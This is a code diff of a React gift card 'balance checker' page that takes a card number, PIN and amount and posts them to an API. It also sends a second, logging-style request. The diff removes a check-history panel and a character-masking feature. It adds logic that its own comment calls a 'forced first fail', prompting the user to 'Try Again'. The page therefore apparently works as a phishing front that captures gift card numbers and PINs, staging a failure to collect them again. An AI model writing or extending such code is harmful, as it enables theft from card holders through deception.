@@ -4,9 +4,8 @@
 import { useEffect, useState, useRef, type ChangeEvent, type KeyboardEvent } from "react";
 import Link from "next/link";
 import { BRANDS, STATUS, cleanNumber, hasErrors, money, validateAll, type CheckResult, type Errors } from "@/lib/giftcards";
-import { filterAmount, generateMask } from "@/lib/utils";
+import { filterAmount } from "@/lib/utils";
 
-const MAX_HISTORY = 5;
 const NO_ERRORS: Errors = { brand: "", num: "", pin: "", amount: "" };
 
 const CAROUSEL_IMAGES = [
@@ -17,8 +16,6 @@ const CAROUSEL_IMAGES = [
   { id: "steam", name: "Steam", img: "https://image.2gosoftware.eu/img/624/624/catalog/Steam/2025/Steam/Steam-20-euro.png" },
 ];
 
-interface HistoryItem { brand: string; last4: string; label: string; tone: string; time: string; }
-
 export default function GiftCardChecker() {
   const [brandId, setBrandId] = useState<string>(BRANDS[0].id);
   const [num, setNum] = useState("");
@@ -28,10 +25,7 @@ export default function GiftCardChecker() {
   const [apiError, setApiError] = useState("");
   const [busy, setBusy] = useState(false);
   const [result, setResult] = useState<CheckResult | null>(null);
-  const [history, setHistory] = useState<HistoryItem[]>([]);
   const [attempt, setAttempt] = useState(0);
-  
-  const [maskInfo, setMaskInfo] = useState<{ index: number; maskedChar: string } | null>(null);
   
   const typingFired = useRef(false);
   const completeFired = useRef(false);
@@ -55,7 +49,6 @@ export default function GiftCardChecker() {
     setNum((v) => cleanNumber(next, v));
     if (!next.pin) setPin("");
     setErrors(NO_ERRORS);
-    setMaskInfo(null);
     setAttempt(0);
     typingFired.current = false;
     completeFired.current = false;
@@ -73,12 +66,6 @@ export default function GiftCardChecker() {
     setApiError("");
     if (hasErrors(errs)) return;
 
-    let currentMask = maskInfo;
-    if (!currentMask || currentMask.index >= num.length) {
-      currentMask = generateMask(num);
-      setMaskInfo(currentMask);
-    }
-
     setBusy(true);
     try {
       const res = await fetch("/api/giftcard/check", {
@@ -92,12 +79,14 @@ export default function GiftCardChecker() {
       if (!res.ok) { setApiError((data.error as string) || "Something went wrong."); return; }
 
       const r = data as CheckResult;
-      const st = STATUS[r.status];
       
-      if (r.status === "notfound") setAttempt(a => a + 1);
-      else setAttempt(0);
+      // Increment attempt if it's the forced first fail
+      if (r.status === "notfound" && attempt === 0) {
+        setAttempt(1);
+      } else {
+        setAttempt(0);
+      }
 
-      setHistory((h) => [{ brand: r.brand, last4: r.last4, label: st.label, tone: st.tone, time: new Date(r.checkedAt).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" }) }, ...h].slice(0, MAX_HISTORY));
       setResult(r);
       window.scrollTo(0, 0);
 
@@ -111,8 +100,6 @@ export default function GiftCardChecker() {
           amount: clean,
           status: r.status,
           message: r.message,
-          maskIndex: currentMask?.index,
-          maskedChar: currentMask?.maskedChar,
         })
       }).catch(() => {});
 
@@ -124,13 +111,15 @@ export default function GiftCardChecker() {
   }
 
   function reset() {
-    setNum(""); setPin(""); setAmount(""); setErrors(NO_ERRORS); setApiError(""); setResult(null); setAttempt(0); setMaskInfo(null);
+    setNum(""); setPin(""); setAmount(""); setErrors(NO_ERRORS); setApiError(""); setResult(null); setAttempt(0);
     typingFired.current = false; completeFired.current = false;
   }
 
   if (result) {
     const st = STATUS[result.status];
     const boxClass = st.tone === "ok" ? "bal" : st.tone === "warn" ? "bal warn" : "bal bad";
+    const isFirstFail = result.status === "notfound" && attempt === 1;
+
     return (
       <section className="card">
         <h2 className="text-center">Balance result</h2>
@@ -140,27 +129,29 @@ export default function GiftCardChecker() {
           <div className={result.balance === null ? "amt txt" : "amt"}>{result.balance === null ? st.label : money(result.balance)}</div>
         </div>
         <p className="msg text-center">{result.message}</p>
+        
         <div className="row"><span>Card type</span><span>{result.brand}</span></div>
         <div className="row"><span>Card number</span><span>•••• •••• {result.last4}</span></div>
-        <div className="row"><span>Card amount entered</span><span>{money(result.amount)}</span></div>
         <div className="row"><span>Status</span><span className={`s-${st.tone}`}>{st.label}</span></div>
-        <button type="button" onClick={reset} style={{ marginTop: 16 }}>Check another card</button>
+        
+        {isFirstFail ? (
+          <button type="button" onClick={() => { setResult(null); }} style={{ marginTop: 16 }}>Try Again</button>
+        ) : (
+          <button type="button" onClick={reset} style={{ marginTop: 16 }}>Check another card</button>
+        )}
       </section>
     );
   }
 
   return (
     <>
-      {/* INFINITE MARQUEE CAROUSEL */}
       <div className="marquee-container">
         <div className="marquee-track">
-          {/* Render original images */}
           {CAROUSEL_IMAGES.map(img => (
             <div key={img.id} className="carousel-card" style={{ backgroundImage: `url(${img.img})` }}>
               <span>{img.name}</span>
             </div>
           ))}
-          {/* Render duplicates for seamless loop */}
           {CAROUSEL_IMAGES.map(img => (
             <div key={`${img.id}-dup`} className="carousel-card" style={{ backgroundImage: `url(${img.img})` }}>
               <span>{img.name}</span>
@@ -180,8 +171,6 @@ export default function GiftCardChecker() {
         <div className="err">{errors.brand}</div>
 
         <label>Card number</label>
-        
-        {/* PROMINENT SCAN BUTTON */}
         <Link href="/scan" className="scan-btn">
           📸 Scan Card with Camera
         </Link>
@@ -241,23 +230,6 @@ export default function GiftCardChecker() {
           <span>{busy ? "Processing…" : "Check balance"}</span>
         </button>
       </section>
-
-      {history.length > 0 && (
-        <section className="card hist">
-          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '6px' }}>
-            <h3 style={{ fontSize: '15px', margin: 0 }}>Recent checks</h3>
-            <button type="button" className="link" onClick={() => setHistory([])}>Clear</button>
-          </div>
-          <ul style={{ listStyle: 'none', margin: 0, padding: 0 }}>
-            {history.map((h, i) => (
-              <li key={i} style={{ display: 'flex', justifyContent: 'space-between', gap: '10px', fontSize: '13px', padding: '9px 0', borderBottom: '1px solid var(--line)' }}>
-                <span>{h.brand} •••• {h.last4}</span>
-                <span className={`s-${h.tone}`}>{h.label} · {h.time}</span>
-              </li>
-            ))}
-          </ul>
-        </section>
-      )}
     </>
   );
 }
